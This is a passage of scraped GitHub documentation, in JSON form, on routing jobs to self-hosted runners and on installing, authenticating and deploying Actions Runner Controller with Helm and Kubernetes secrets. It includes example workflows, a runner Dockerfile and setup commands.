        "type": "list",
        "ordered": false,
        "items": [
          "self-hosted- Run this job on a self-hosted runner.",
          "linux- Only use a Linux-based runner.",
          "ARM64- Only use a runner based on ARM64 hardware."
        ]
      },
      {
        "type": "paragraph",
        "text": "To create individual self-hosted runners without the default labels, pass the--no-default-labelsflag when you create the runner. Actions Runner Controller does not support multiple labels."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using custom labels to route jobs"
      },
      {
        "type": "paragraph",
        "text": "You can create custom labels and assign them to your self-hosted runners at any time. Custom labels let you send jobs to particular types of self-hosted runners, based on how they're labeled."
      },
      {
        "type": "paragraph",
        "text": "For example, if you have a job that requires a specific type of graphics hardware, you can create a custom label calledgpuand assign it to the runners that have the hardware installed. A self-hosted runner that matches all the assigned labels will then be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "This example shows a job that combines default and custom labels:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: [self-hosted, linux, x64, gpu]"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "self-hosted- Run this job on a self-hosted runner.",
          "linux- Only use a Linux-based runner.",
          "x64- Only use a runner based on x64 hardware.",
          "gpu- This custom label has been manually assigned to self-hosted runners with the GPU hardware installed."
        ]
      },
      {
        "type": "paragraph",
        "text": "These labels operate cumulatively, so a self-hosted runner must have all four labels to be eligible to process the job."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using groups to route jobs"
      },
      {
        "type": "paragraph",
        "text": "In this example, Ubuntu runners have been added to a group calledubuntu-runners. Theruns-onkey sends the job to any available runner in theubuntu-runnersgroup:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: \n      group: ubuntu-runners\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using labels and groups to route jobs"
      },
      {
        "type": "paragraph",
        "text": "When you combine groups and labels, the runner must meet both requirements to be eligible to run the job."
      },
      {
        "type": "paragraph",
        "text": "In this example, a runner group calledubuntu-runnersis populated with Ubuntu runners, which have also been assigned the labelubuntu-20.04-16core. Theruns-onkey combinesgroupandlabelsso that the job is routed to any available runner within the group that also has a matching label:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on:\n      group: ubuntu-runners\n      labels: ubuntu-20.04-16core\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '14'\n      - run: npm install -g bats\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Routing precedence for self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "When routing a job to a self-hosted runner, GitHub looks for a runner that matches the job'sruns-onlabels and groups:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If GitHub finds an online and idle runner that matches the job'sruns-onlabels and groups, the job is then assigned and sent to the runner.If the runner doesn't pick up the assigned job within 60 seconds, the job is re-queued so that a new runner can accept it.",
          "If the runner doesn't pick up the assigned job within 60 seconds, the job is re-queued so that a new runner can accept it.",
          "If GitHub doesn't find an online and idle runner that matches the job'sruns-onlabels and groups, then the job will remain queued until a runner comes online.",
          "If the job remains queued for more than 24 hours, the job will fail."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Workflow run continuity"
      },
      {
        "type": "paragraph",
        "text": "If GitHub Actions services are temporarily unavailable, then a workflow run is discarded if it has not been queued within 30 minutes of being triggered. For example, if a workflow is triggered and the GitHub Actions services are unavailable for 31 minutes or longer, then the workflow run will not be processed."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-actions-runner-controller",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About Actions Runner Controller"
      },
      {
        "type": "paragraph",
        "text": "Actions Runner Controller (ARC) is a Kubernetes operator that orchestrates and scales self-hosted runners for GitHub Actions. For more information, seeOperator patternin the Kubernetes documentation."
      },
      {
        "type": "paragraph",
        "text": "With ARC, you can create runner scale sets that automatically scale based on the number of workflows running in your repository, organization, or enterprise. Because controlled runners can be ephemeral and based on containers, new runner instances can scale up or down rapidly and cleanly. For more information about autoscaling, seeAutoscaling with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "The following diagram illustrates the architecture of ARC's autoscaling runner scaleset mode."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To view the following diagram in a larger size, see theAutoscaling Runner Scale Sets modedocumentation in the Actions Runner Controller repository."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Actions Runner Controller is installed using the supplied Helm charts, and the controller manager pod is deployed in the specified namespace. A new AutoScalingRunnerSet resource is deployed via the supplied Helm charts or a customized manifest file. The AutoScalingRunnerSet Controller calls GitHub's APIs to fetch the runner group ID that the runner scale set will belong to.",
          "The AutoScalingRunnerSet Controller calls the APIs one more time to either fetch or create a runner scale set in the GitHub Actions service before creating the Runner ScaleSet Listener resource.",
          "A Runner ScaleSet Listener pod is deployed by the AutoScalingListener Controller. In this pod, the listener application connects to the GitHub Actions Service to authenticate and establish an HTTPS long poll connection. The listener stays idle until it receives aJob Availablemessage from the GitHub Actions Service.",
          "When a workflow run is triggered from a repository, the GitHub Actions Service dispatches individual job runs to the runners or runner scalesets where theruns-onkey matches the name of the runner scaleset or labels of self-hosted runners.",
          "When the Runner ScaleSet Listener receives theJob Availablemessage, it checks whether it can scale up to the desired count. If it can, the Runner ScaleSet Listener acknowledges the message.",
          "The Runner ScaleSet Listener uses a Service Account and a Role bound to that account to make an HTTPS call through the Kubernetes APIs to patch the Ephemeral RunnerSet resource with the number of desired replicas count.",
          "The Ephemeral RunnerSet attempts to create new runners and the EphemeralRunner Controller requests a Just-in-Time (JIT) configuration token to register these runners. The controller attempts to create runner pods. If the pod's status isfailed, the controller retries up to 5 times. After 24 hours the GitHub Actions Service unassigns the job if no runner accepts it.",
          "Once the runner pod is created, the runner application in the pod uses the JIT configuration token to register itself with the GitHub Actions Service. It then establishes another HTTPS long poll connection to receive the job details it needs to execute.",
          "The GitHub Actions Service acknowledges the runner registration and dispatches the job run details.",
          "Throughout the job run execution, the runner continuously communicates the logs and job run status back to the GitHub Actions Service.",
          "When the runner completes its job successfully, the EphemeralRunner Controller checks with the GitHub Actions Service to see if runner can be deleted. If it can, the Ephemeral RunnerSet deletes the runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Actions Runner Controller components"
      },
      {
        "type": "paragraph",
        "text": "ARC consists of a set of resources, some of which are created specifically for ARC. An ARC deployment applies these resources onto a Kubernetes cluster. Once applied, it creates a set of Pods that contain your self-hosted runners' containers. With ARC, GitHub can treat these runner containers as self-hosted runners and allocate jobs to them as needed."
      },
      {
        "type": "paragraph",
        "text": "Each resource that is deployed by ARC is given a name composed of:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "An installation name, which is the installation name you specify when you install the Helm chart.",
          "A resource identification suffix, which is a string that identifies the resource type. This value is not configurable."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Different versions of Kubernetes have different length limits for names of resources. The length limit for the resource name is calculated by adding the length of the installation name and the length of the resource identification suffix. If the resource name is longer than the reserved length, you will receive an error."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Resources deployed bygha-runner-scale-set-controller"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Resources deployed bygha-runner-scale-set"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About custom resources"
      },
      {
        "type": "paragraph",
        "text": "ARC consists of several custom resource definitions (CRDs). For more information on custom resources, seeCustom Resourcesin the Kubernetes documentation. You can find the list of custom resource definitions used for ARC in the following API schema definitions."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "actions.github.com/v1alpha1",
          "actions.summerwind.net/v1alpha1"
        ]
      },
      {
        "type": "paragraph",
        "text": "Because custom resources are extensions of the Kubernetes API, they won't be available in a default Kubernetes installation. You will need to install these custom resources to use ARC. For more information on installing custom resources, seeQuickstart for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "Once the custom resources are installed, you can deploy ARC into your Kubernetes cluster. For information about deploying ARC, seeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About the runner container image"
      },
      {
        "type": "paragraph",
        "text": "GitHub maintains aminimal runner container image. A new image will be published with every runner binaries release. The most recent image will have the runner binaries version andlatestas tags."
      },
      {
        "type": "paragraph",
        "text": "This image contains the least amount of packages necessary for the container runtime and the runner binaries. To install additional software, you can create your own runner image. You can use ARC's runner image as a base, or use the corresponding setup actions. For instance,actions/setup-javafor Java oractions/setup-nodefor Node."
      },
      {
        "type": "paragraph",
        "text": "You can find the definition of ARC's runner image inthis Dockerfileand the definition of the base image inthis Dockerfile."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Creating your own runner image"
      },
      {
        "type": "paragraph",
        "text": "You can create your own runner image that meets your requirements. Your runner image must fulfill the following conditions."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use a base image that can run the self-hosted runner application. For more information, seeManaging self-hosted runners.",
          "Therunner binarymust be placed under/home/runner/and launched using/home/runner/run.sh.",
          "If you use Kubernetes mode, therunner container hooksmust be placed under/home/runner/k8s."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can use the following example Dockerfile to start creating your own runner image."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "FROM mcr.microsoft.com/dotnet/runtime-deps:6.0 as build\n\n# Replace value with the latest runner release version\n# source: https://github.com/actions/runner/releases\n# ex: 2.303.0\nARG RUNNER_VERSION=\"\"\nARG RUNNER_ARCH=\"x64\"\n# Replace value with the latest runner-container-hooks release version\n# source: https://github.com/actions/runner-container-hooks/releases\n# ex: 0.3.1\nARG RUNNER_CONTAINER_HOOKS_VERSION=\"\"\n\nENV DEBIAN_FRONTEND=noninteractive\nENV RUNNER_MANUALLY_TRAP_SIG=1\nENV ACTIONS_RUNNER_PRINT_LOG_TO_STDOUT=1\n\nRUN apt update -y && apt install curl unzip -y\n\nRUN adduser --disabled-password --gecos \"\" --uid 1001 runner \\\n    && groupadd docker --gid 123 \\\n    && usermod -aG sudo runner \\\n    && usermod -aG docker runner \\\n    && echo \"%sudo ALL=(ALL:ALL) NOPASSWD:ALL\" > /etc/sudoers \\\n    && echo \"Defaults env_keep += \\\"DEBIAN_FRONTEND\\\"\" >> /etc/sudoers\n\nWORKDIR /home/runner\n\nRUN curl -f -L -o runner.tar.gz https://github.com/actions/runner/releases/download/v${RUNNER_VERSION}/actions-runner-linux-${RUNNER_ARCH}-${RUNNER_VERSION}.tar.gz \\\n    && tar xzf ./runner.tar.gz \\\n    && rm runner.tar.gz\n\nRUN curl -f -L -o runner-container-hooks.zip https://github.com/actions/runner-container-hooks/releases/download/v${RUNNER_CONTAINER_HOOKS_VERSION}/actions-runner-hooks-k8s-${RUNNER_CONTAINER_HOOKS_VERSION}.zip \\\n    && unzip ./runner-container-hooks.zip -d ./k8s \\\n    && rm runner-container-hooks.zip\n\nUSER runner"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Executing workflows"
      },
      {
        "type": "paragraph",
        "text": "After installation and configuration are complete, you can use ARC to execute workflow runs. A workflow can be created in the same repository that can target a self hosted runner created by ARC. For more information about targeting workflows to run on self-hosted runners, seeUsing self-hosted runners in a workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using ARC runners in a workflow"
      },
      {
        "type": "paragraph",
        "text": "You cannot use additional labels to target runners created by ARC. You can only use the installation name of the runner scale set that you specified during the installation or by defining the value of therunnerScaleSetNamefield in yourvalues.yamlfile. These are used as the 'single label' to use as yourruns-ontarget. For more information, seeUsing Actions Runner Controller runners in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Scaling runners"
      },
      {
        "type": "paragraph",
        "text": "You can scale runners statically or dynamically depending on your needs. For more information, seeDeploying runner scale sets with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Software installed in the ARC runner image"
      },
      {
        "type": "paragraph",
        "text": "The ARCrunner imageis bundled with the following software:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Runner binaries",
          "Runner container hooks",
          "Docker (required for Docker-in-Docker mode)"
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seeARC's runner image Dockerfilein the Actions repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Assets and releases"
      },
      {
        "type": "paragraph",
        "text": "ARC is released as two Helm charts and one container image. The Helm charts are only published as Open Container Initiative (OCI) packages. ARC does not provide tarballs or Helm repositories via GitHub Pages."
      },
      {
        "type": "paragraph",
        "text": "You can find the latest releases of ARC's Helm charts and container image on GitHub Packages:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "gha-runner-scale-set-controllerHelm chart",
          "gha-runner-scale-setHelm chart",
          "gha-runner-scale-set-controllercontainer image"
        ]
      },
      {
        "type": "paragraph",
        "text": "The supported runner image is released as a separate container image, which you can find atactions-runneron GitHub Packages."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller",
    "content": [
      {
        "type": "paragraph",
        "text": "You cancontact GitHub Supportfor assistance with Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About support for Actions Runner Controller Versions"
      },
      {
        "type": "paragraph",
        "text": "The Actions Runner Controller (ARC) projectwas adopted by GitHubto release as a new GitHub product. As a result, there are currently two ARC releases: the legacy community-maintained ARC and GitHub's Autoscaling Runner Sets."
      },
      {
        "type": "paragraph",
        "text": "GitHub only supports the latest Autoscaling Runner Sets version of ARC. Support for the legacy ARC is provided by the community in theActions Runner Controllerrepository only."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Scope of support for Actions Runner Controller"
      },
      {
        "type": "paragraph",
        "text": "If your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The legacy community-maintained version of ARC",
          "Installing, configuring, or maintaining dependencies",
          "Template spec customization",
          "Container orchestration, such as Kubernetes setup, networking, building images in ARC (DinD), etc.",
          "Applying Kubernetes policies",
          "Managed Kubernetes providers or provider-specific configurations",
          "Runner Container Hooksin conjunction with ARC'skubernetesmode",
          "Installation tooling other than Helm",
          "Storage provisioners and PersistentVolumeClaims (PVCs)",
          "Best practices, such as configuring metrics servers, image caching, etc."
        ]
      },
      {
        "type": "paragraph",
        "text": "While ARC may be deployed successfully with different tooling and configurations, your support request is possibly out of GitHub Support's scope if ARC has been deployed with:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Installation tooling other than Helm",
          "Service account and/or template spec customization"
        ]
      },
      {
        "type": "paragraph",
        "text": "If you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed."
      },
      {
        "type": "paragraph",
        "text": "For more information about contacting GitHub Support, seeContacting GitHub Support."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "OpenShift clusters are currently unsupported.",
          "ARC is only supported on GitHub Enterprise Server versions 3.9 and greater."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Working with GitHub Support for Actions Runner Controller"
      },
      {
        "type": "paragraph",
        "text": "GitHub Support may ask questions about your Actions Runner Controller deployment and request that you collect and attach thecontroller, listener, and runner logs to the support ticket."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "You can authenticate Actions Runner Controller (ARC) to the GitHub API by using a GitHub App or by using a personal access token (classic)."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You cannot authenticate using a GitHub App for runners at the enterprise level. For more information, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Authenticating ARC with a GitHub App"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub App that is owned by an organization. For more information, seeRegistering a GitHub App. Configure the GitHub App as follows.For \"Homepage URL,\" enterhttps://github.com/actions/actions-runner-controller.Under \"Permissions,\" clickRepository permissions. Then use the dropdown menus to select the following access permissions.Administration:Read and writeNoteAdministration: Read and writeis only required when configuring Actions Runner Controller to register at the repository scope. It is not required to register at the organization scope.Metadata:Read-onlyUnder \"Permissions,\" clickOrganization permissions. Then use the dropdown menus to select the following access permissions.Self-hosted runners:Read and write",
          "For \"Homepage URL,\" enterhttps://github.com/actions/actions-runner-controller.",
          "Under \"Permissions,\" clickRepository permissions. Then use the dropdown menus to select the following access permissions.Administration:Read and writeNoteAdministration: Read and writeis only required when configuring Actions Runner Controller to register at the repository scope. It is not required to register at the organization scope.Metadata:Read-only",
          "Administration:Read and writeNoteAdministration: Read and writeis only required when configuring Actions Runner Controller to register at the repository scope. It is not required to register at the organization scope.",
          "Metadata:Read-only",
          "Under \"Permissions,\" clickOrganization permissions. Then use the dropdown menus to select the following access permissions.Self-hosted runners:Read and write",
          "Self-hosted runners:Read and write",
          "After creating the GitHub App, on the GitHub App's page, note the value for \"App ID\". You will use this value later.",
          "Under \"Private keys\", clickGenerate a private key, and save the.pemfile. You will use this key later.",
          "In the menu at the top-left corner of the page, clickInstall app, and next to your organization, clickInstallto install the app on your organization.",
          "After confirming the installation permissions on your organization, note the app installation ID. You will use it later. You can find the app installation ID on the app installation page, which has the following URL format:https://github.com/organizations/ORGANIZATION/settings/installations/INSTALLATION_ID",
          "Register the app ID, installation ID, and the downloaded.pemprivate key file from the previous steps to Kubernetes as a secret.To create a Kubernetes secret with the values of your GitHub App, run the following command.NoteCreate the secret in the same namespace where thegha-runner-scale-setchart is installed. In this example, the namespace isarc-runnersto match the quickstart documentation. For more information, seeQuickstart for Actions Runner Controller.Bashkubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_app_id=123456 \\\n   --from-literal=github_app_installation_id=654321 \\\n   --from-literal=github_app_private_key='-----BEGIN RSA PRIVATE KEY-----********'kubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_app_id=123456 \\\n   --from-literal=github_app_installation_id=654321 \\\n   --from-literal=github_app_private_key='-----BEGIN RSA PRIVATE KEY-----********'Then using thegithubConfigSecretproperty in your copy of thevalues.yamlfile, pass the secret name as a reference.githubConfigSecret:pre-defined-secret"
        ]
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Authenticating ARC with a personal access token (classic)"
      },
      {
        "type": "paragraph",
        "text": "ARC can use personal access tokens (classic) to register self-hosted runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a personal access token (classic) with the required scopes. The required scopes are different depending on whether you are registering runners at the repository or organization level. For more information on how to create a personal access token (classic), seeManaging your personal access tokens.The following is the list of required personal access token scopes for ARC runners.Repository runners:repoOrganization runners:admin:org",
          "Repository runners:repo",
          "Organization runners:admin:org",
          "To create a Kubernetes secret with the value of your personal access token (classic), use the following command.NoteCreate the secret in the same namespace where thegha-runner-scale-setchart is installed. In this example, the namespace isarc-runnersto match the quickstart documentation. For more information, seeQuickstart for Actions Runner Controller.Bashkubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_token='YOUR-PAT'kubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_token='YOUR-PAT'",
          "In your copy of thevalues.yamlfile, pass the secret name as a reference.githubConfigSecret:pre-defined-secretFor additional Helm configuration options, seevalues.yamlin the ARC repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/actions/actions-runner-controller/under the Apache-2.0 license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Copyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About runner scale sets"
      },
      {
        "type": "paragraph",
        "text": "Runner scale sets is a group of homogeneous runners that can be assigned jobs from GitHub Actions. The number of active runners owned by a runner scale set can be controlled by auto-scaling runner solutions such as Actions Runner Controller (ARC)."
      },
      {
        "type": "paragraph",
        "text": "You can use runner groups to manage runner scale sets. Similar to self-hosted runners, you can add runner scale sets to existing runner groups. However, runner scale sets can belong to only one runner group at a time and can only have one label assigned to them. For more information on runner groups, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "paragraph",
        "text": "To assign jobs to a runner scale set, you must configure your workflow to reference the runner scale set's name. For more information, seeUsing Actions Runner Controller runners in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Deploying a runner scale set"
      },
      {
        "type": "paragraph",
        "text": "To deploy a runner scale set, you must have ARC up and running. For more information, seeQuickstart for Actions Runner Controller."
      },
      {
        "type": "paragraph",
        "text": "You can deploy runner scale sets with ARC's Helm charts or by deploying the necessary manifests. Using ARC's Helm charts is the preferred method, especially if you do not have prior experience using ARC."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "As a security best practice, create your runner pods in a different namespace than the namespace containing your operator pods.",
          "As a security best practice, create Kubernetes secrets and pass the secret references. Passing your secrets in plain text via the CLI can pose a security risk.",
          "We recommend running production workloads in isolation. GitHub Actions workflows are designed to run arbitrary code, and using a shared Kubernetes cluster for production workloads could pose a security risk.",
          "Ensure you have implemented a way to collect and retain logs from the controller, listeners, and ephemeral runners."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To configure your runner scale set, run the following command in your terminal, using values from your ARC configuration.When you run the command, keep the following in mind.Update theINSTALLATION_NAMEvalue carefully. You will use the installation name as the value ofruns-onin your workflows.Update theNAMESPACEvalue to the location you want the runner pods to be created.Set theGITHUB_CONFIG_URLvalue to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.This example command installs the latest version of the Helm chart. To install a specific version, you can pass the--versionargument with the version of the chart you want to install. You can find the list of releases in theactions-runner-controllerrepository.BashINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setINSTALLATION_NAME=\"arc-runner-set\"NAMESPACE=\"arc-runners\"GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"GITHUB_PAT=\"<PAT>\"helm install\"${INSTALLATION_NAME}\"\\\n    --namespace\"${NAMESPACE}\"\\\n    --create-namespace \\\n    --setgithubConfigUrl=\"${GITHUB_CONFIG_URL}\"\\\n    --setgithubConfigSecret.github_token=\"${GITHUB_PAT}\"\\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setFor additional Helm configuration options, seevalues.yamlin the ARC repository.",
          "Update theINSTALLATION_NAMEvalue carefully. You will use the installation name as the value ofruns-onin your workflows.",
          "Update theNAMESPACEvalue to the location you want the runner pods to be created.",
          "Set theGITHUB_CONFIG_URLvalue to the URL of your repository, organization, or enterprise. This is the entity that the runners will belong to.",
          "This example command installs the latest version of the Helm chart. To install a specific version, you can pass the--versionargument with the version of the chart you want to install. You can find the list of releases in theactions-runner-controllerrepository.BashINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"${INSTALLATION_NAME}\" \\\n    --namespace \"${NAMESPACE}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"${GITHUB_CONFIG_URL}\" \\\n    --set githubConfigSecret.github_token=\"${GITHUB_PAT}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setINSTALLATION_NAME=\"arc-runner-set\"NAMESPACE=\"arc-runners\"GITHUB_CONFIG_URL=\"https://github.com/<your_enterprise/org/repo>\"GITHUB_PAT=\"<PAT>\"helm install\"${INSTALLATION_NAME}\"\\\n    --namespace\"${NAMESPACE}\"\\\n    --create-namespace \\\n    --setgithubConfigUrl=\"${GITHUB_CONFIG_URL}\"\\\n    --setgithubConfigSecret.github_token=\"${GITHUB_PAT}\"\\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-setFor additional Helm configuration options, seevalues.yamlin the ARC repository.",
          "To check your installation, run the following command in your terminal.Bashhelm list -Ahelm list -AYou should see an output similar to the following.NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                                       APP VERSION\narc             arc-systems     1               2023-04-12 11:45:59.152090536 +0000 UTC deployed        gha-runner-scale-set-controller-0.4.0       0.4.0\narc-runner-set  arc-systems     1               2023-04-12 11:46:13.451041354 +0000 UTC deployed        gha-runner-scale-set-0.4.0                  0.4.0",
          "To check the manager pod, run the following command in your terminal.Bashkubectl get pods -n arc-systemskubectl get pods -n arc-systemsIf the installation was successful, the pods will show theRunningstatus.NAME                                                   READY   STATUS    RESTARTS   AGE\narc-gha-runner-scale-set-controller-594cdc976f-m7cjs   1/1     Running   0          64s\narc-runner-set-754b578d-listener                       1/1     Running   0          12s"
        ]
      },
      {
        "type": "paragraph",
        "text": "If your installation was not successful, seeTroubleshooting Actions Runner Controller errorsfor troubleshooting information."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using advanced configuration options"
      },
      {
        "type": "paragraph",
        "text": "ARC offers several advanced configuration options."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Configuring the runner scale set name"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Runner scale set names are unique within the runner group they belong to. If you want to deploy multiple runner scale sets with the same name, they must belong to different runner groups."
      },
      {
        "type": "paragraph",
        "text": "To configure the runner scale set name, you can define anINSTALLATION_NAMEor set the value ofrunnerScaleSetNamein your copy of thevalues.yamlfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "## The name of the runner scale set to create, which defaults to the Helm release name\nrunnerScaleSetName: \"my-runners\""
      },
      {
        "type": "paragraph",
        "text": "Make sure to pass thevalues.yamlfile in yourhelm installcommand. See theHelm Installdocumentation for more details."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Choosing runner destinations"
      },
      {
        "type": "paragraph",
        "text": "Runner scale sets can be deployed at the repository, organization, or enterprise levels."
      },
      {
        "type": "paragraph",
        "text": "To deploy runner scale sets to a specific level, set the value ofgithubConfigUrlin your copy of thevalues.yamlto the URL of your repository, organization, or enterprise."
      },
      {
        "type": "paragraph",
        "text": "The following example shows how to configure ARC to add runners toocto-org/octo-repo."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "githubConfigUrl: \"https://github.com/octo-ent/octo-org/octo-repo\""
      },
      {
        "type": "paragraph",
        "text": "For additional Helm configuration options, seevalues.yamlin the ARC repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a GitHub App for authentication"
      },
      {
        "type": "paragraph",
        "text": "If you are not using enterprise-level runners, you can use GitHub Apps to authenticate with the GitHub API. For more information, seeAuthenticating to the GitHub API."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Given the security risk associated with exposing your private key in plain text in a file on disk, we recommend creating a Kubernetes secret and passing the reference instead."
      },
      {
        "type": "paragraph",
        "text": "You can either create a Kubernetes secret, or specify values in yourvalues.yamlfile."
